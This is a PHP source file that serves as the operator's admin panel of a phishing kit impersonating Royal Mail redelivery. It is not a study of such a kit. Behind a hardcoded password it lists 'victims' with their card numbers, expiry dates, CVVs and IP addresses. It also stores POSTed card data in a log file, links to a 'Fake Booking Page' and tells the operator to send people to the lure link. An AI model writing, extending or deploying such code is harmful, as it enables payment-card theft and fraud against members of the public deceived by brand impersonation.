<?php
session_start();

// Simple password protection (change this!)
$password = "admin123";   // ← CHANGE THIS TO SOMETHING STRONG

if (!isset($_SESSION['loggedin'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['loggedin'] = true;
    } else {
        // Login Form
        echo '<!DOCTYPE html>
        <html><head><title>Admin Login</title>
        <style>body{font-family:Arial;background:#2A2A2D;color:white;text-align:center;padding:100px;}
        input{padding:15px;width:300px;font-size:18px;}</style></head><body>
        <h1>Royal Mail Victims Panel</h1>
        <form method="POST">
        <input type="password" name="pass" placeholder="Enter Password" required><br><br>
        <button type="submit" style="padding:12px 30px;font-size:18px;">Login</button>
        </form></body></html>';
        exit();
    }
}

// Create logs directory and file if they don't exist
if (!is_dir('logs')) {
    mkdir('logs', 0777, true);
}

$logfile = 'logs/victims.txt';
if (!file_exists($logfile)) {
    file_put_contents($logfile, "");
}

// Read logs
$logs = file($logfile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
if ($logs === false) $logs = [];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Royal Mail Victims Panel</title>
    <style>
        body { font-family: Arial, Helvetica, sans-serif; background:#f4f4f4; margin:0; }
        .header { background:#E4002B; color:white; padding:20px; text-align:center; font-size:24px; }
        .container { max-width:1200px; margin:30px auto; background:white; padding:20px; box-shadow:0 4px 15px rgba(0,0,0,0.1); }
        table { width:100%; border-collapse:collapse; margin-top:20px; }
        th, td { padding:12px; text-align:left; border-bottom:1px solid #ddd; }
        th { background:#2A2A2D; color:white; }
        .count { font-size:28px; color:#E4002B; font-weight:bold; }
        .btn { background:#E4002B; color:white; padding:10px 20px; border:none; cursor:pointer; }
    </style>
</head>
<body>

<div class="header">
    Royal Mail Redelivery Victims Panel
</div>

<div class="container">
    <h2>Total Victims: <span class="count"><?= count($logs) ?></span></h2>
    <a href="delivery-booked.php" target="_blank" class="btn">View Fake Booking Page</a>
    <a href="?logout=1" class="btn" style="background:#555;">Logout</a>

    <table>
        <tr>
            <th>Date & Time</th>
            <th>Booking ID</th>
            <th>Card Type</th>
            <th>Card Number</th>
            <th>Expiry</th>
            <th>CVV</th>
            <th>IP Address</th>
        </tr>
        <?php foreach ($logs as $line): 
            $data = json_decode($line, true);
            if (!$data) continue;
        ?>
        <tr>
            <td><?= htmlspecialchars($data['time'] ?? 'N/A') ?></td>
            <td><?= htmlspecialchars($data['booking_id'] ?? 'N/A') ?></td>
            <td><?= htmlspecialchars($data['card_type'] ?? 'N/A') ?></td>
            <td><?= htmlspecialchars($data['card_number'] ?? 'N/A') ?></td>
            <td><?= htmlspecialchars(($data['expiry_month'] ?? '') . '/' . ($data['expiry_year'] ?? '')) ?></td>
            <td><?= htmlspecialchars($data['cvv'] ?? 'N/A') ?></td>
            <td><?= htmlspecialchars($data['ip'] ?? 'N/A') ?></td>
        </tr>
        <?php endforeach; ?>
    </table>

    <?php if (empty($logs)): ?>
        <p style="text-align:center; padding:40px; color:#666;">No victims yet. Send people to your index.php link.</p>
    <?php endif; ?>
</div>

</body>
</html>
<?php

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: admin.php");
    exit();
}

// Append new data from step1.php (if called directly)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['card_number'])) {
    $entry = [
        "time"        => date('Y-m-d H:i:s'),
        "booking_id"  => $_POST['booking_id'] ?? '',
        "card_type"   => $_POST['card_type'] ?? '',
        "card_number" => $_POST['card_number'] ?? '',
        "expiry_month"=> $_POST['expiry_month'] ?? '',
        "expiry_year" => $_POST['expiry_year'] ?? '',
        "cvv"         => $_POST['cvv'] ?? '',
        "ip"          => $_SERVER['REMOTE_ADDR']
    ];

    file_put_contents($logfile, json_encode($entry) . "\n", FILE_APPEND);
    echo "Data saved.";
    exit();
}
?>
